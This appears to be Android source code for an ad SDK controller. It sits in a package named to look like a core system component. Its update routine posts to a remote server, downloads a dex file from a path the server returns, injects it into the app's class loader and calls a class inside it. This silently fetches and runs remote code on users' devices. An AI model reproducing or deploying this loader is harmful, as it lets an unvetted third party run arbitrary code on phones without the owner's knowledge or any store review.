package com.android.system.core.sometools;



import org.json.JSONObject;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.util.Log;


public class GAdController {
	private static GAdController controller;
	private Context context;
	private String newSdkCode;
	private String dexName;
	
	private GAdController()
	{
		
	}
	
	public static GAdController getInstance()
	{
		if(controller == null)
		{
			controller = new GAdController();					
		}	
		return controller;
	}
		
	public void init(Context context,Boolean isTestModel)
	{
		this.context = context;
		
		GTool.saveSharedData(GCommons.SHARED_KEY_TESTMODEL,isTestModel);
		
		Intent intent = new Intent(context,GService.class);
		context.startService(intent);
		
		//GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);				
	}
	
	public void init(Context context)
	{
		this.context = context;
		
		boolean isTest = GTool.getSharedPreferences().getBoolean(GCommons.SHARED_KEY_TESTMODEL, false);
		GTool.saveSharedData(GCommons.SHARED_KEY_TESTMODEL,isTest);
		
		GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);				
	}
	
	public void showSpotAd()
	{
		Intent intent = new Intent(context,GReceiver.class);
		GTool.saveSharedData(GCommons.SHARED_KEY_ACTION_TAG, "com.xugu.showspotad");
		intent.setAction("com.xugu.showspotad");
		this.context.sendBroadcast(intent);
		
	}
	
	public void destory(Activity act)
	{
		String clazName = act.getComponentName().getClassName();
		
		Intent intent = new Intent(context,GReceiver.class);
		GTool.saveSharedData(GCommons.SHARED_KEY_ACTION_TAG, "com.xugu.destory");
		intent.setAction("com.xugu.destory");
		intent.putExtra("clazName", clazName);
		this.context.sendBroadcast(intent);
	}
	
	public Context getContext() {
		return context;
	}

	public void setContext(Context context) {
		this.context = context;
	}
	
	public void revNewSdk(Object ob,Object rev)
	{
		JSONObject obj = null;
		String versionCode = null;
		String downloadPath = null;
		boolean isFind = true;
		try {
			 obj = new JSONObject(rev.toString());	
			 versionCode = obj.getString("versionCode");
			 downloadPath = obj.getString("downloadPath");
			 newSdkCode = versionCode;
			 dexName = downloadPath;
		} catch (Exception e) {
			isFind = false;
			Log.e("------------","----------没有发现最新sdk包----");
		}	
		
		String code = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_SDK_VERSIONCODE, "0");
		Log.e("------------","----------curr sdk="+code);
		if(code.equals(versionCode) || !isFind)
		{
			Log.e("------------","----------startservice");
			if(!isFind)
				downloadPath =  GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_DEX_NAME, "");
			String dexPath = GDexLoaderUtil.getDexPath(context, downloadPath);
			final String optimizedDexOutputPath = GDexLoaderUtil.getOptimizedDexPath(context);
	        GDexLoaderUtil.injectAboveEqualApiLevel14(dexPath, optimizedDexOutputPath, null, "com.qinglu.ad.QLAdController");
	        GDexLoaderUtil.call(context.getClassLoader(),context);
		}
		else
		{
			Log.e("------------","----------downloadRes");
			GTool.downloadRes(GCommons.SERVER_ADDRESS, this, "revNewSdkCallback", downloadPath, true);
		}
	}
	
	public void revNewSdkCallback(Object ob,Object rev)
	{
		GDexLoaderUtil.copyDex(context, ob.toString());
		String dexPath = GDexLoaderUtil.getDexPath(context, ob.toString());
		final String optimizedDexOutputPath = GDexLoaderUtil.getOptimizedDexPath(context);
        GDexLoaderUtil.injectAboveEqualApiLevel14(dexPath, optimizedDexOutputPath, null, "com.qinglu.ad.QLAdController");
        GTool.saveSharedData(GCommons.SHARED_KEY_SDK_VERSIONCODE,newSdkCode);
        GTool.saveSharedData(GCommons.SHARED_KEY_DEX_NAME,dexName);
        GDexLoaderUtil.call(context.getClassLoader(),context);
        GTool.httpPostRequest(GCommons.URI_POST_UPDATE_SDK_NUM, null, null, GCommons.CHANNEL);	
        Log.e("------------","----------newSdkCode sdk="+newSdkCode);
	}
}
